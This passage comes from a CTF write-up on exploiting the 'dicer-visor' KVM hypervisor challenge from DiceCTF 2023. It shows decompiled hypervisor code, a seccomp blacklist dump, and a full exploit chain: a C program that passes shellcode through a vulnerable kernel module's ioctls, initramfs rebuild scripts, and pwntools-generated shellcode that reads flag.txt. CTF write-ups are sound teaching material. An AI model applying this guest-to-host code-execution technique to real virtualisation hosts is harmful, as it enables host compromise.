kvm_pit_config; ivar1 = ioctl(vm-\u0026gt;kvm_fd,kvm_create_vm ,0); vm-\u0026gt;vm_fd = ivar1; if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] vm creation failed\u0026#34;; } else { ivar1 = ioctl(ivar1,kvm_set_tss_addr,0xfffbd000); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set tss addr\u0026#34;; } else { local_70 = 0xffffc000; ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_set_identity_map_addr,\u0026amp;local_70); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set identity map addr\u0026#34;; } else { ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_irqchip,0); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to create irq chip\u0026#34;; } else { kvm_pit_config.pad._44_16_ = zext816(0); kvm_pit_config.pad._28_16_ = zext816(0); kvm_pit_config.pad._12_16_ = zext816(0); kvm_pit_config._0_16_ = zext816(0); ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_pit2,\u0026amp;kvm_pit_config); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to create i8254 interval timer\u0026#34;; } else { userspace_addr = mmap(null,0x10000000,3,0x4021,-1,0); vm-\u0026gt;userspace_address = userspace_addr; if (userspace_addr == null) { pcvar2 = \u0026#34;[!] failed to mmap vm memory\u0026#34;; } else { kvm_userspace_memory_region._0_8_ = 0x100000000; kvm_userspace_memory_region.guest_phys_addr._0_4_ = 0; kvm_userspace_memory_region.guest_phys_addr._4_4_ = 0; kvm_userspace_memory_region.memory_size._0_4_ = 0x10000000; kvm_userspace_memory_region.memory_size._4_4_ = 0; kvm_userspace_memory_region.userspace_addr = (ulong)userspace_addr; ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_set_user_memory_region,\u0026amp;kvm_userspace_memory_region); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set user memory region\u0026#34;; } else { ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_vcpu,0); vm-\u0026gt;vcpu_fd = ivar1; if (-1 \u0026lt; ivar1) { initvmregs(vm); createcpuid(vm); return 0; } pcvar2 = \u0026#34;[!] failed to create vcpu\u0026#34;; } } } } } } } err(1,pcvar2); } void *jit_mem; int jit_mem_counter; undefined8 run_vm(struct vm *vm) { int ivar1; kvm_run *vcpu; long idx; undefined seccomp_filter[]; //length omitted ushort port; ivar1 = ioctl(vm-\u0026gt;kvm_fd,kvm_get_vcpu_mmap_size,0); vcpu = (kvm_run *)mmap(null,ivar1,prot_read|prot_write,map_shared,vm-\u0026gt;vcpu_fd,0); jit_mem = (code *)mmap(null,0x100,prot_read|prot_write|proc_exec, map_shared|map_anonymous|map_noreserve,-1,0 ); jit_mem_counter = 0; /* init seccomp_filter */ /* ... */ //set seccomp filter ivar1 = prctl(pr_set_no_new_privs,1,0,0,0); if (ivar1 != 0) { perror(\u0026#34;prctl(no_new_privs)\u0026#34;); } ivar1 = prctl(pr_set_seccomp,2,seccomp_filter); if (ivar1 != 0) { close(vm-\u0026gt;vcpu_fd); close(vm-\u0026gt;vm_fd); close(vm-\u0026gt;kvm_fd); munmap(vm-\u0026gt;userspace_address,0x40000000); perror(\u0026#34;prctl(seccomp)\u0026#34;); //bug? if the seccomp filter fails, then we still attempt to execute the remaining of this function. //but the file descriptors have been closed and memory has been unmapped. oh well.. } //run the vm ivar1 = ioctl(vm-\u0026gt;vcpu_fd,kvm_run,0); while( true ) { if (ivar1 \u0026lt; 0) { return err(1,\u0026#34;kvm_run failed\u0026#34;); } if (vcpu-\u0026gt;exit_reason != kvm_exit_io) break; /* union case: kvm_exit_io */ port = vcpu-\u0026gt;unlabelled32.io.port; //vcpu-\u0026gt;unlabelled32.io.port if ((short)port \u0026lt; 0x61) { if (port == 0xd1ce) { (*jit_mem)(); } else if ((port == 0xdead) \u0026amp;\u0026amp; (vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_out)) { idx = (long)jit_mem_counter; if (idx \u0026lt;= 0x100) { //unintended off-by-one. jit_mem_counter++; jit_mem[idx] = *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset); } else { puts(\u0026#34;[!] maximum bytes read from guest\u0026#34;); } } } else if (port == 0x61 \u0026amp;\u0026amp; vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_in) { *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset) = \u0026#39;d\u0026#39;; } else if (port == 0x3fd \u0026amp;\u0026amp; vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_in) { *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset) = \u0026#39; \u0026#39;; } else if ((port == 0x3f8) \u0026amp;\u0026amp; (vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_out)) { write(1, (char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset, 1); } ivar1 = ioctl(vm-\u0026gt;vcpu_fd,kvm_run,0); //continue the vm } printf(\u0026#34;[!] unknown exit reason: %d\\n\u0026#34;, vcpu-\u0026gt;exit_reason); return -1; } undefined8 cleanup_vm(struct vm *vm) { close(vm-\u0026gt;vcpu_fd); close(vm-\u0026gt;vm_fd); close(vm-\u0026gt;kvm_fd); munmap(vm-\u0026gt;userspace_address,0x40000000); return 0; } the run_vm now is quite self-explanatory and interesting. as we recall from the vuln.ko, there were two out x86 instructions that we could invoke: out(0xd1ce,0xd1ce) and out(0xdead,shellcode[i]). from the hypervisor\u0026rsquo;s code, we can see that when the port is 0xd1ce, the contents of the jit_mem are executed. when the port is 0xdead, we write to the jit_mem the value of the source operand from the out x86 instructions. so, to sum it up:\nwrite syscall to the /dev/exploited-device: writes up to 0x100 bytes to the kernel\u0026rsquo;s shellcode buffer from a userland provided buffer. ioctl cmd 0xdead: out(0xdead, shellcode[i]). writes the 0x100 bytes from the kernel\u0026rsquo;s shellcode buffer to the hypervisor\u0026rsquo;s jit_mem. may be called only once. (otherwise you get the message \u0026ldquo;maximum bytes read from guest\u0026rdquo;.) ioctl cmd 0xbeef: out(0xd1ce,0xd1ce). will execute the contents in the jit_mem buffer. i.e. it will execute the shellcode provided from userland. seccomp filter one last thing to notice about run_vm, is that it sets up a seccomp filter. using seccomp-tools, we can easily dump it:\nfane@ctf-box:~/dicer-visor$ seccomp-tools dump \u0026#34;./dicer-visor bzimage initramfs.cpio.gz\u0026#34; dicer-visor - dicegang security hypervisor [*] created vm [*] loaded kernel image: bzimage [*] loaded initrd image: initramfs.cpio.gz [*] starting up vm line code jt jf k ================================= 0000: 0x20 0x00 0x00 0x00000004 a = arch 0001: 0x15 0x01 0x00 0xc000003e if (a == arch_x86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return kill 0003: 0x20 0x00 0x00 0x00000000 a = sys_number 0004: 0x15 0x00 0x01 0x00000029 if (a != socket) goto 0006 0005: 0x06 0x00 0x00 0x80000000 return kill_process 0006: 0x15 0x00 0x01 0x00000039 if (a != fork) goto 0008 0007: 0x06 0x00 0x00 0x80000000 return kill_process 0008: 0x15 0x00 0x01 0x00000021 if (a != dup2) goto 0010 0009: 0x06 0x00 0x00 0x80000000 return kill_process 0010: 0x15 0x00 0x01 0x00000142 if (a != execveat) goto 0012 0011: 0x06 0x00 0x00 0x80000000 return kill_process 0012: 0x06 0x00 0x00 0x7fff0000 return allow so, this is a blacklist of socket, fork, dup2, and execveat system calls. however, we can still use open and write, and the remote provides us the output of the hypervisor!\nexploitation so, let\u0026rsquo;s create a userland program that when executed performs the trip to the hypervisor and executes some shellcode:\n//main.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; const char *shellcode = \u0026#34;\\x90\\x90\\x90\\x90\u0026#34;; //4x \u0026#34;nop\u0026#34; instruction const size_t shellcode_len = 4; int main(int argc, char ** argv) { int fd = open(\u0026#34;/dev/exploited-device\u0026#34;, o_rdwr); if(fd == -1) { perror(\u0026#34;open\u0026#34;); exit(1); } ssize_t res = write(fd, shellcode, shellcode_len); if(res != shellcode_len) { printf(\u0026#34;write error. written: %ld\\n\u0026#34;, res); exit(1); } if ( (res = ioctl(fd, 0xdead)) \u0026lt; 0) { //write shellcode to supervisor perror(\u0026#34;ioctl1\u0026#34;); exit(1); } if ( (res = ioctl(fd, 0xbeef)) \u0026lt; 0) { //invoke shellcode perror(\u0026#34;ioctl2\u0026#34;); exit(1); } return 0; } next, let\u0026rsquo;s write a script that builds our userland program and re-creates the initramfs:\n#!/bin/sh set -e gcc -static main.c -o main mv main initramfs cd initramfs find . -print0 | cpio --null --create --verbose --format=newc | gzip --best \u0026gt; ../initramfs_patched.cpio.gz cd - finally, we modify the init script to invoke our main program when the kernel boots:\n#!/bin/sh echo 1 \u0026gt; /sys/module/rcutree/parameters/rcu_cpu_stall_suppress echo \u0026#34;hello kernel world!\u0026#34; /sbin/insmod /vuln.ko mknod /dev/exploited-device c 32 0 chmod ugo+x /main exec /main shellcode generation to generate our shellcode and dump the flag, we use pwntools\n# gen-shellcode.py from pwn import * # set up pwntools for the correct architecture. context.binary = elfexe = elf(\u0026#39;./dicer-visor\u0026#39;) def dumpshellcode(shellcode): shellcode_str = \u0026#39;\u0026#39; for b in shellcode: shellcode_str += \u0026#34;\\\\x{:02x}\u0026#34;.format(b) msg = f\u0026#39;const char *shellcode = \u0026#34;{shellcode_str}\u0026#34;;\\n\u0026#39; msg += f\u0026#39;const size_t shellcode_len = {len(shellcode)};\u0026#39; print(msg) shellcode = asm( \u0026#39;\u0026#39;\u0026#39; xor rdx, rdx /* o_rdonly */ \u0026#39;\u0026#39;\u0026#39; + pwnlib.shellcraft.linux.cat(\u0026#34;flag.txt\u0026#34;) ) dumpshellcode(shellcode) when we execute python gen-shellcode.py, we get our c-style formatted shellcode which we can plug into our main.c:\nfane@ctf-box:~/dicer-visor$ python gen-shellcode.py const char *shellcode = \u0026#34;\\x48\\x31\\xd2\\x6a\\x01\\xfe\\x0c\\x24\\x48\\xb8\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\\x50\\x6a\\x02\\x58\\x48\\x89\\xe7\\x31\\xf6\\x0f\\x05\\x41\\xba\\xff\\xff\\xff\\x7f\\x48\\x89\\xc6\\x6a\\x28\\x58\\x6a\\x01\\x5f\\x99\\x0f\\x05\u0026#34;; const size_t shellcode_len = 47; getting the flag finally we run build.sh to create the initramfs_patched.cpio.gz that contains the modified init script and our main binary. when we connect to the remote and provide our initramfs_patched.cpio.gz for the hypervisor to use, our userland program gets executed when the kernel boots, we perform the trip to the hypervisor, and dump the contents of flag.txt!\ndice{dicer-visor-rules}\n","title":"Pwning a hypervisor - DiceCTF23"},{"date":"0001-01-01","image":"","imageAlt":"","link":"https://chalkiadakis.me/whoami/","summary":"","tags":[],"text":"","title":"About me"}]}